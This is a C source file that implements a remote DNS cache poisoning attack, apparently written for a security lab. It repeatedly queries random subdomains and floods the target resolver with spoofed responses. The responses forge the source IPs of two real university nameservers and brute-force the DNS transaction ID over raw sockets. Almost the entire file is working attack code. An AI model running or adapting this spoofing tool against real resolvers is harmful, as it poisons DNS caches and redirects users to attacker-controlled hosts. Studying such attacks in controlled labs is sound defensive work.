#include "remote_dns_attack.h"

#define NAME_LEN 5                          // Length of random name.
#define MAX_SIZE 1024
#define SPOOF_TIMES 100                     // Spoofed response nums per request.
#define NS1 "202.114.0.120"                 // dns1.hust.edu.cn
#define NS2 "59.172.234.181"                // dns2.hust.edu.cn
#define REQUEST_FILE "dns_request.bin"
#define RESPONSE_FILE "dns_response.bin"
#define OFFSET_REQUEST_QDSEC_QNAME 41
#define OFFSET_RESPONSE_IP_SRC 12
#define OFFSET_RESPONSE_DNS_ID 28
#define OFFSET_RESPONSE_QDSEC_QNAME 41
#define OFFSET_RESPONSE_ANSSEC_QNAME 64

uint32_t checksum(uint16_t* buffer, int byte_size);
uint16_t checksum_word(uint16_t* buffer, int word_size);
uint16_t ip_checksum(uint8_t* buffer);
uint16_t udp_checksum(uint8_t* buffer, int udp_byte_size);
void send_dns_request(uint8_t* request, int size, char* name);
void send_dns_response(uint8_t* response, int size, char* src_ip, char* name, uint16_t id);
void send_raw_packet(uint8_t* buffer, int size);

int main() {
    srand(time(NULL));
    clock_t start = clock();

    uint16_t id = 0;
    uint64_t request_cnt = 0, response_cnt = 0;
    size_t dns_request_size, dns_response_size;
    uint8_t dns_request[MAX_SIZE], dns_response[MAX_SIZE];

    // Open and load the dns request created by python code.
    FILE* fp_request = fopen(REQUEST_FILE, "rb");
    if (!fp_request) {
        printf("Open " REQUEST_FILE " Failed!\n");
        exit(-1);
    }
    dns_request_size = fread(dns_request, 1, MAX_SIZE, fp_request);

    // Open and load the dns response created by python code.
    FILE* fp_response = fopen(RESPONSE_FILE, "rb");
    if (!fp_response) {
        printf("Open " RESPONSE_FILE " Failed!\n");
        exit(-1);
    }
    dns_response_size = fread(dns_response, 1, MAX_SIZE, fp_response);

    char alpha[26] = "abcdefghijklmnopqrstuvwxyz", name[NAME_LEN + 1] = { '\0' };
    printf("Start attack...\n");
    printf("Request Sent      Response Sent      Time Spent      Last Name\n");

    // Start the attack.
    while (1) {
        // Generate a random name of length 5.
        for (int i = 0; i < NAME_LEN; i++) { name[i] = alpha[rand() % 26]; }

        // Send DNS request to the target DNS server.
        request_cnt++;
        send_dns_request(dns_request, dns_request_size, name);

        // Send spoofed responses to the target DNS server.
        for (int i = 0; i < SPOOF_TIMES; i++, id++, response_cnt += 2) {
            send_dns_response(dns_response, dns_response_size, NS1, name, id);
            send_dns_response(dns_response, dns_response_size, NS2, name, id);
        }

        // Show running information.
        printf("\r%12" PRIu64 "      %13" PRIu64 "      %9lds      %9s",
               request_cnt, response_cnt, (clock() - start) / CLOCKS_PER_SEC, name);
        fflush(stdout);
    }

    return 0;
}

void send_dns_request(uint8_t* request, int size, char* name) {
    // Modify the name in queries.
    memcpy(request + OFFSET_REQUEST_QDSEC_QNAME, name, NAME_LEN);

    // Send the DNS request.
    send_raw_packet(request, size);
}

void send_dns_response(uint8_t* response, int size, char* src_ip, char* name, uint16_t id) {
    // Modify the src IP.
    unsigned long ip = inet_addr(src_ip);
    memcpy(response + OFFSET_RESPONSE_IP_SRC, (void*)&ip, 4);

    // Modify the transaction ID.
    uint16_t id_net = htons(id);
    memcpy(response + OFFSET_RESPONSE_DNS_ID, (void*)&id_net, 2);

    // Modify the name in queries.
    memcpy(response + OFFSET_RESPONSE_QDSEC_QNAME, name, NAME_LEN);

    // Modify the name in answers.
    memcpy(response + OFFSET_RESPONSE_ANSSEC_QNAME, name, NAME_LEN);

    // Send the DNS response.
    send_raw_packet(response, size);
}

void send_raw_packet(uint8_t* buffer, int size) {
    struct sockaddr_in dest_info;
    int enable = 1;

    // Create a raw network socket, and set its options.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock == -1) {
        perror("SOCKET INIT FAIL!\n");
        exit(-1);
    }
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    // Calculate the checksum of UDP.
    struct ipheader* ip = (struct ipheader*)buffer;
    struct udpheader* udp = (struct udpheader*)(buffer + sizeof(struct ipheader));
    udp->udph_chksum = udp_checksum(buffer, size - sizeof(struct ipheader));

    // No need to set the ip->iph_chksum, as it will be set by the system.
    // ip->iph_chksum = ip_checksum(buffer);

    // Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Send the packet out.
    // if (size != 63) {
    //     printf("%d", ntohs(udp->udph_srcport));
    //     if (udp->udph_srcport != htons(53)) { exit(-1); }
    // }
    if (sendto(sock, buffer, size, 0, (struct sockaddr*)&dest_info, sizeof(dest_info)) < 0) {
        perror("PACKET NOT SENT!\n");
        return;
    }
    close(sock);
}